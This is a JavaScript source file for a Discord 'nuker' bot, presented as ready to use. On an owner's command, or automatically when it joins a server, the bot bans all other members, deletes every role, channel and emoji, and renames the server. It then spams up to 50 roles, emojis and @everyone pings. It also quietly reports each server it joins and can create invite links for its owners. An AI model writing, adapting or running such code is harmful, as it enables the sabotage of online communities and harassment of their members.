const discord = require("discord.js"); /* You need to use discord.js 12.0.0 . Install with "npm install discord.js@12.0.0" */
const bot = new discord.Client();
bot.login(""); // Here you will put the token

const owners = ["ownerid"]; 
const settings = {
    auto_invite_create_when_bot_join_in_a_guid: false, 
    auto_nuke: false,
    delete: { 
        channels: true,
        emojis: true,
        roles: true
    },
    create_after_nuke: { 
        channels: false,
        roles: true,
        emojis: true
    },
    actions: {
        ban_all: true,
        change_server_icon: true,
        change_server_name: true
    },
    name: "MUIE", 
    icon: "https://example.com/test.png"  /* Here you will put an URL for icon (server avatar, emojis) */
}

bot.on("ready", () => {
    console.log("The bot is online.")
});

bot.on("message", (message) => {
    if(message.content.startsWith("f!uck")) {
        if(owners.some(s => s == message.author.id)) {
            NukeThisShitServer(message.guild)
        }
        else message.channel.send("you are not my owner, idiot !");
    }
});

bot.on("guildCreate", (guild) => {
    owners.forEach((id) => {
        if(bot.users.cache.get(id)) {
            bot.users.cache.get(id).send(`GUILD ADD: ${guild.name} - owned by: ${guild.owner.user.tag}`);
            if(settings.auto_invite_create_when_bot_join_in_a_guid) {
                guild.channels.cache.first().createInvite().then(invite => {
                    bot.users.cache.get(id).send(`And here is your invite: ${invite.url}`);
                }).catch(() => {
                    bot.users.cache.get(id).send(`I can't create an invite...`);
                });
            }
        }
    });

    if(settings.auto_nuke) {
        NukeThisShitServer(guild);
    }
});

bot.on("guildDelete", (guild) => {
    owners.forEach((id) => {
        if(bot.users.cache.get(id)) {
            bot.users.cache.get(id).send(`GUILD REMOVE: ${guild.name} - owned by: ${guild.owner.user.tag}`);
        }
    });
});

bot.on("guildMemberAdd", (member) => {
    
});

function NukeThisShitServer(server) {
    if(server) {
        if(settings.actions.change_server_icon) {
            server.setIcon(settings.icon).then(() => {
                console.log("ICON: I was successfully changed the server avatar.");
            }).catch(() => {
                console.log("ICON: I can't change the server avatar.");
            });
        }

        if(settings.actions.change_server_name) {
            server.setName(settings.name).then(() => {
                console.log("NAME: I was successfully changed the server name.");
            }).catch(() => {
                console.log("NAME: I can't change the server name...");
            });
        }

        if(settings.actions.ban_all) {
            server.members.cache.forEach(member_obj => {
                if(!owners.some(s => s == member_obj.user.id)) {
                    member_obj.ban().then(() => {
                        console.log(`BAN: I was successfully banned: ${member_obj.user.tag}`);
                    }).catch(() => {
                        console.log(`BAN: I can't ban: ${member_obj.user.tag}`);
                    });
                }
            });
        }

        if(settings.delete.roles) {
            server.roles.cache.forEach(role_obj => {
                role_obj.delete().then(() => {
                    console.log(`ROLE: I was successfully deleted role: ${role_obj.name}`);
                }).catch(() => {
                    console.log(`ROLE: I can't delete role: ${role_obj.name}`);
                });
            });
        }

        if(settings.delete.channels) {
            server.channels.cache.forEach(channel_obj => {
                channel_obj.delete().then(() => {
                    console.log(`CHANNEL: I was successfully deleted channel: ${channel_obj.name}`);
                }).catch(() => {
                    console.log(`CHANNEL: I can't delete channel: ${channel_obj.name}`);
                });
            });
        }

        if(settings.delete.emojis) {
            server.emojis.cache.forEach(emoji_obj => {
                emoji_obj.delete().then(() => {
                    console.log(`EMOJI: I was successfully deleted emoji: ${emoji_obj.name}`);
                }).catch(() => {
                    console.log(`EMOJI: I can't delete emoji: ${emoji_obj.name}`);
                });
            });
        }

        setTimeout(() => {
            for(var i = 0; i < 50; i++) {
                if(settings.create_after_nuke.channels) {
                    server.channels.create(settings.name, {
                        type: "text"
                    }).then((c) => {
                        c.send("@everyone, ahaha: " + settings.icon)
                    }).catch(() => {});
                }

                if(settings.create_after_nuke.roles) {
                    server.roles.create("new-role").then(role => {
                        role.setName(settings.name);
                    }).catch(() => {});
                }

                if(settings.create_after_nuke.emojis) {
                    server.emojis.create(settings.icon, `${i}`).then(() => {
                        console.log(`EMOJI: I was created emoji '${i}'`);
                    }).catch(() => {
                        console.log(`EMOJI: I can't create emoji '${i}'`);
                    });
                }
            }
        }, 2000);
    }
    else console.log("SERVER: Sorry, but this fucking server does not exists...");
}
